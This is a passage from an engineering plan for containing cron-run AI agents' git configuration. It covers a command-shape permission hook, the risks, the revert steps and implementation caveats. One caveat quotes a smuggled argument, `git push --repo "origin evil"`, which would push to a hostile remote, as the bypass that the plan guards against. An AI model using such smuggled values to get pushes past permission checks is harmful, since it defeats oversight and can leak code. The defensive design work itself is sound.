  read-only `gh issue list --state all --search '"Automated FAILED self-report" in:body created:>=<merge date>' --json number,body`,
  then count the bodies that contain `cron-containment:`. The query was checked on 2026-11-16: it returns the known
  historical self-reports (for example #12466), so a zero count is a real zero, not a broken query. The same query
  also covers the quiet failure. Count bug-fixer and roadmap-review self-reports whose body contains
  `Author identity unknown`, plus the Sentry `cron-git-config-pin` count from AC14.

## Dependencies & Risks

- **Risk: over-deny breaks a live cron step.** Mitigation: the allowlist-census row proves every plain-spaced
  allowlisted git/gh line still passes the shape rule, and the must-pass rows cover the commands the cron prompts
  prescribe (scoped `git add`, `git commit -m`, `git push -u origin`, branch create/switch, `gh issue create` with a
  multi-word body). The deny reason tells the agent how to recover.
- **Risk: a cron depends on a HOME global key other than identity.** Ruled out: nothing at runtime writes
  `~/.gitconfig` from server code (`git grep "config --global\|setup-git"` finds only `Dockerfile:467-468`, which is
  identity). One qualifier: agent-session sandboxes (not crons) bind `~/.gitconfig` read-write
  (`server/agent-outer-wrap.ts`, `infra/agent-outer-wrap-argv.json`), so a founder agent session could write it. With
  the pin, cron git ignores it. That bind is recorded for the G4 follow-up under #9601 (`agent-env.ts`-adjacent, OUT
  here).
- **Risk: census brittleness.** Mitigation: the census uses the TypeScript compiler API, not regex plus a brace
  matcher (CTO G6), and the Guard 3 harness rows.
- **Revert path.**
  - *Trigger:* a FAILED self-report, or a permission denial, whose reason is `irregular command word` or `flag before
    the sub-command` on a command that a cron prompt prescribes with plain spaces.
  - *First response:* revert only the Phase 1.2 commit. It is kept separate for this. That leaves the pin and the
    write protection in place, because a full revert would reopen #12757.
  - *Label recovery (CTO H2):* the runbook carries a separate line, `Operator-authorizes: remove bot-fix/attempted
    from issues <N...>`, which names the exact issues AC14(c) found. It is a GitHub write at revert time, so it is not
    automatic, and this PR performs no GitHub write.
  - *Full revert:* `git revert <merge-sha>` restores the previous hook and envs in one commit. Nothing is migrated,
    flagged or persisted. Whether a redeploy recreates the container's writable layer, and so drops a
    `~/.gitconfig` written meanwhile, is unverified (CTO H4). The plan does not rely on it. After a full revert,
    the `cron-git-xdg-config-present` probe is gone too, so read the HOME state through a read-only route before
    trusting the reverted git.
- **Dependency:** none. No operator step and no credential.

## Sharp Edges

- A plan whose `## User-Brand Impact` section is empty, holds only stand-in text, or omits the threshold will
  fail `deepen-plan` Phase 4.6. This one is filled in. Keep it filled through any rewrite.
- Never feed `gitVerbReason` or `filingJustificationReason` the normalised split. It reopens
  `git push --repo "origin evil"` and cuts a quoted `--body` to its first word. The shape rule (A1) is what makes the
  raw tokens safe to keep reading.
- Shape-check only the command words (git 0-1; gh 0-2, or 0-1 for `gh api`). Extending the check to arguments brings
  back the over-deny on honest commit messages.
- The hook cannot import `AGENT_GIT_GLOBAL_CONFIG`; the test row that imports it is the only drift guard. Keep it
  importing the constant, never a copied string.
- Spread `CRON_GIT_CONFIG_PIN` **last**. A spread placed first is overridden by any later key, and census row 2
  checks the position.
- Never swap a `/dev/null` pin (`GIT_HARDENING_ENV`, `gitIsolatedEnv`, `spawnGitCapture`) for the identity file. That
  is a weaker pin (CTO F-A).
- Do not edit `tokenize`, `normalizeSegmentWhitespace` or `segmentMatchesAllowlist`. The framing hook imports them,
  and the ADR-287 differential binds them.
- The 26/23/15 counts were measured on 2026-11-16. If a sibling PR adds a cron before this merges, rebase, re-run
  the sweep, and update `KNOWN_HOME_LITERALS`/`KNOWN_GIT_SPAWNS` in the same commit. Never relax a map to a `>=` floor.
- A leading NBSP before `git` is trimmed by `splitSegments`; never write a test row that relies on it.
- Real-git row 5 must build its env explicitly. Inheriting `process.env` would trip the vitest git tripwire in a
  worktree (`GIT_DIR`/`GIT_INDEX_FILE`), and would test the developer's HOME.

## References & Research

- Issue #12757; epic #9601; origin #12705 (verification pass, F1/F2); agent-session precedent #9600 (`agent-env.ts`
  `GIT_CARRIER_ENV_PIN`); K1' #11076.
- ADR-033 (cron spawn), ADR-287 (framing hook, the shared normaliser), ADR-050 2026-11-09 amendment (host-side git),
  ADR-278 (`:106`).
- Learnings: see Research Insights.
- Decisions: `knowledge-base/project/specs/feat-one-shot-12757-cron-gitconfig-containment/decision-challenges.md`.
